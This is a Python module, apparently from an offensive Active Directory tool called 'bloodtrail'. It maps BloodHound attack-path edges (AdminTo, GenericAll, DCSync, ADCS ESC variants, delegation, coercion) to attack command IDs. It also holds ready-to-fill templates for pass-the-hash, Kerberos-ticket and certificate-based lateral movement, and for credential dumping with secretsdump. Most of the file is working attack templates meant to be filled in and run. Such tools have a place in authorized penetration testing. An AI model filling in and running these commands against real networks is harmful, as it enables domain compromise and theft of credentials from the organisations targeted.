"""
Edge and credential type mappings for bloodtrail.

Maps BloodHound edges and credential types to command IDs and templates.
"""

from typing import Dict, List, Optional, Tuple


# Maps credential type + access type to appropriate command IDs
CRED_TYPE_COMMANDS: Dict[str, Dict[str, List[str]]] = {
    "password": {
        "AdminTo": ["impacket-psexec", "impacket-wmiexec", "impacket-smbexec"],
        "CanRDP": ["xfreerdp-connect"],
        "CanPSRemote": ["evil-winrm-shell"],
        "ExecuteDCOM": ["impacket-dcomexec"],
        "DCSync": ["ad-dcsync-impacket-secretsdump-user"],
    },
    "ntlm-hash": {
        "AdminTo": ["psexec-pth", "wmiexec-pth", "smbexec-pth"],
        "CanRDP": ["xfreerdp-pth"],
        "CanPSRemote": ["evil-winrm-hash"],
        "ExecuteDCOM": ["wmiexec-pth"],
        "DCSync": ["ad-dcsync-impacket-secretsdump-hash"],
    },
    "kerberos-ticket": {
        "AdminTo": ["psexec-kerberos", "wmiexec-kerberos"],
        "CanRDP": ["xfreerdp-kerberos"],
        "CanPSRemote": ["evil-winrm-kerberos"],
        "ExecuteDCOM": ["wmiexec-kerberos"],
        "DCSync": ["ad-dcsync-impacket-secretsdump-kerberos"],
    },
    "aes-key": {
        "AdminTo": ["getTGT-aeskey", "psexec-kerberos"],
        "CanPSRemote": ["getTGT-aeskey", "evil-winrm-kerberos"],
        "DCSync": ["getTGT-aeskey", "ad-dcsync-impacket-secretsdump-kerberos"],
    },
    "certificate": {
        "AdminTo": ["certipy-auth-pth"],
        "CanRDP": ["certipy-auth-rdp"],
        "CanPSRemote": ["certipy-auth-winrm"],
        "ExecuteDCOM": ["certipy-auth-pth"],
        "DCSync": ["certipy-auth-dcsync"],
    },
}


# Command templates by credential type (with auto-fill placeholders)
CRED_TYPE_TEMPLATES: Dict[str, Dict[str, str]] = {
    "password": {
        "AdminTo": "impacket-psexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
        "CanRDP": "xfreerdp /v:<TARGET> /u:<USERNAME> /p:'<CRED_VALUE>' /d:<DOMAIN>",
        "CanPSRemote": "evil-winrm -i <TARGET> -u <USERNAME> -p '<CRED_VALUE>'",
        "DCSync": "impacket-secretsdump '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<DC_IP>",
        "secretsdump": "impacket-secretsdump '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
    },
    "ntlm-hash": {
        "AdminTo": "impacket-psexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
        "CanRDP": "xfreerdp /v:<TARGET> /u:<USERNAME> /pth:<CRED_VALUE> /d:<DOMAIN>",
        "CanPSRemote": "evil-winrm -i <TARGET> -u <USERNAME> -H <CRED_VALUE>",
        "DCSync": "impacket-secretsdump -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<DC_IP>",
        "secretsdump": "impacket-secretsdump -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
    },
    "kerberos-ticket": {
        "AdminTo": "KRB5CCNAME=<CRED_VALUE> impacket-psexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
        "CanRDP": "xfreerdp /v:<TARGET> /u:<USERNAME> /d:<DOMAIN> /kerberos",
        "CanPSRemote": "KRB5CCNAME=<CRED_VALUE> evil-winrm -i <TARGET> -r <DOMAIN>",
        "DCSync": "KRB5CCNAME=<CRED_VALUE> impacket-secretsdump -k -no-pass '<DOMAIN>/<USERNAME>'@<DC_IP>",
        "secretsdump": "KRB5CCNAME=<CRED_VALUE> impacket-secretsdump -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
    },
    "aes-key": {
        "AdminTo": "impacket-getTGT '<DOMAIN>/<USERNAME>' -aesKey <CRED_VALUE> && KRB5CCNAME=<USERNAME>.ccache impacket-psexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
        "DCSync": "impacket-getTGT '<DOMAIN>/<USERNAME>' -aesKey <CRED_VALUE> && KRB5CCNAME=<USERNAME>.ccache impacket-secretsdump -k -no-pass '<DOMAIN>/<USERNAME>'@<DC_IP>",
    },
    "certificate": {
        "AdminTo": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && impacket-psexec -hashes :<NTLM> '<DOMAIN>/<USERNAME>'@<TARGET>",
        "CanRDP": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && xfreerdp /v:<TARGET> /u:<USERNAME> /pth:<NTLM>",
        "CanPSRemote": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && evil-winrm -i <TARGET> -u <USERNAME> -H <NTLM>",
        "ExecuteDCOM": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && impacket-dcomexec -hashes :<NTLM> '<DOMAIN>/<USERNAME>'@<TARGET>",
        "DCSync": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && impacket-secretsdump -hashes :<NTLM> '<DOMAIN>/<USERNAME>'@<DC_IP>",
    },
}


# Target-type-aware edge command map: (edge, target_label) → command IDs
# "*" is the wildcard fallback when no specific target label matches.
EDGE_COMMANDS: Dict[Tuple[str, str], List[str]] = {
    # --- Access Edges ---
    ("AdminTo", "*"): ["impacket-psexec", "impacket-wmiexec", "impacket-smbexec"],
    ("CanRDP", "*"): ["xfreerdp-connect"],
    ("CanPSRemote", "*"): ["evil-winrm-shell"],
    # HasSession is informational — creds live on the box, need AdminTo first to harvest them
    ("HasSession", "*"): [],
    # ExecuteDCOM uses dcomexec, not wmiexec
    ("ExecuteDCOM", "*"): ["impacket-dcomexec"],

    # --- ACL Edges (target-type-aware) ---
    # GenericAll: effect depends entirely on what object type you control
    ("GenericAll", "User"): ["net-user-password-reset", "powerview-set-password"],
    ("GenericAll", "Computer"): ["rbcd-set-msds", "bloodyad-rbcd"],
    ("GenericAll", "Group"): ["net-group-add"],
    # GenericAll on Domain → grant yourself DCSync rights via WriteDACL, then dump
    ("GenericAll", "Domain"): ["dacledit-grant-dcsync", "ad-dcsync-impacket-secretsdump-user"],
    ("GenericAll", "GPO"): ["gpo-abuse-sharpgpoabuse"],
    ("GenericAll", "*"): ["net-user-password-reset"],

    # GenericWrite: set SPN on users (kerberoast), or RBCD on computers
    ("GenericWrite", "User"): ["targeted-kerberoast-set-spn"],
    ("GenericWrite", "Computer"): ["rbcd-set-msds"],
    ("GenericWrite", "*"): ["targeted-kerberoast-set-spn"],

    # WriteDacl: grant yourself rights, then exploit
    ("WriteDacl", "Domain"): ["dacledit-grant-dcsync"],
    ("WriteDacl", "User"): ["dacledit-grant-genericall"],
    ("WriteDacl", "*"): ["dacledit-grant-genericall"],

    ("WriteOwner", "*"): ["owneredit-change-owner"],

    ("ForceChangePassword", "User"): ["powerview-set-password", "net-user-password-reset"],
    ("ForceChangePassword", "*"): ["net-user-password-reset"],

    ("AddMember", "Group"): ["net-group-add"],
    ("AddMember", "*"): ["net-group-add"],

    # Owns: implicit full control — effect is target-type-dependent
    ("Owns", "User"): ["net-user-password-reset"],
    ("Owns", "Computer"): ["rbcd-set-msds"],
    ("Owns", "*"): ["net-user-password-reset"],

    # WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity enables RBCD
    ("WriteProperty", "Computer"): ["rbcd-set-msds"],
    ("WriteProperty", "*"): [],

    ("AddSelf", "Group"): ["net-group-add-self"],
    ("AddSelf", "*"): ["net-group-add-self"],

    ("WriteSPN", "User"): ["targeted-kerberoast-set-spn"],
    ("WriteSPN", "*"): ["targeted-kerberoast-set-spn"],

    # --- Privilege Edges ---
    # GetChanges alone is NOT sufficient for DCSync — needs both GetChanges AND GetChangesAll
    ("GetChanges", "Domain"): [],
    ("GetChanges", "*"): [],
    ("GetChangesAll", "Domain"): [],
    ("GetChangesAll", "*"): [],

    # AllExtendedRights effect is target-type-dependent
    ("AllExtendedRights", "Domain"): ["ad-dcsync-impacket-secretsdump-user"],
    ("AllExtendedRights", "User"): ["net-user-password-reset"],
    ("AllExtendedRights", "Computer"): ["laps-password-cme"],
    ("AllExtendedRights", "*"): ["ad-dcsync-impacket-secretsdump-user"],

    # --- Credential Edges ---
    ("ReadGMSAPassword", "*"): ["gmsadumper", "bloodyad-gmsa"],
    ("ReadLAPSPassword", "*"): ["laps-password-cme", "laps-password-ldapsearch"],
    ("AddKeyCredentialLink", "*"): ["certipy-shadow", "pywhisker"],
    ("SyncLAPSPassword", "*"): ["laps-password-cme", "laps-password-ldapsearch"],

    # --- Delegation Edges ---
    ("AllowedToDelegate", "*"): ["rubeus-s4u-impersonate", "impacket-getST-constrained"],
    ("AllowedToAct", "*"): ["rbcd-getST", "rubeus-s4u-impersonate"],
    ("AddAllowedToAct", "*"): ["rbcd-set-msds"],
    ("WriteAccountRestrictions", "*"): ["rbcd-set-msds", "bloodyad-rbcd"],

    # --- ADCS Edges (each ESC variant gets its own certipy invocation) ---
    ("ADCSESC1", "*"): ["certipy-req-esc1"],
    ("ADCSESC3", "*"): ["certipy-req-esc3"],
    ("ADCSESC4", "*"): ["certipy-req-esc4"],
    ("ADCSESC5", "*"): ["certipy-find"],
    ("ADCSESC6a", "*"): ["certipy-req-esc6"],
    ("ADCSESC6b", "*"): ["certipy-req-esc6"],
    ("ADCSESC7", "*"): ["certipy-req-esc7"],
    ("ADCSESC9a", "*"): ["certipy-req-esc9", "certipy-auth"],
    ("ADCSESC9b", "*"): ["certipy-req-esc9", "certipy-auth"],
    ("ADCSESC10a", "*"): ["certipy-req-esc10", "certipy-auth"],
    ("ADCSESC10b", "*"): ["certipy-shadow"],
    ("ADCSESC13", "*"): ["certipy-req-esc13"],
    ("GoldenCert", "*"): ["certipy-forge"],
    ("Enroll", "*"): ["certipy-req", "certify-request"],
    ("EnrollOnBehalfOf", "*"): ["certipy-req-enroll-on-behalf"],
    ("ManageCA", "*"): ["certipy-req-esc7"],
    ("ManageCertificates", "*"): ["certipy-req-esc7"],

    # --- Coercion Edges ---
    ("CoerceToTGT", "*"): ["petitpotam-coerce", "coercer-coerce", "printerbug-trigger", "dfscoerce-trigger"],

    # --- SID/Trust Edges ---
    ("HasSIDHistory", "*"): ["impacket-psexec", "impacket-wmiexec", "ticketer-sid-history"],
    # TrustedBy requires cross-trust ticket operations, not just psexec
    ("TrustedBy", "*"): ["ticketer-cross-trust", "getST-cross-trust"],

    # --- Membership (informational only) ---
    ("MemberOf", "*"): [],
}


def get_edge_commands(edge: str, target_label: str = "*") -> List[str]:
    """Look up commands for edge+target, falling back to wildcard."""
    return EDGE_COMMANDS.get((edge, target_label)) or EDGE_COMMANDS.get((edge, "*"), [])


# Backward-compatible flat dict — uses wildcard defaults from EDGE_COMMANDS.
# Prefer get_edge_commands() for new code.
EDGE_COMMAND_MAPPINGS: Dict[str, List[str]] = {
    edge: cmds
    for (edge, label), cmds in EDGE_COMMANDS.items()
    if label == "*"
}


def get_commands_for_cred_type(cred_type: str, access_type: str) -> List[str]:
    """Get command IDs for a credential type and access type combination."""
    return CRED_TYPE_COMMANDS.get(cred_type, {}).get(access_type, [])


def get_command_template(cred_type: str, access_type: str) -> Optional[str]:
    """Get ready-to-fill command template for credential type and access type."""
    return CRED_TYPE_TEMPLATES.get(cred_type, {}).get(access_type)
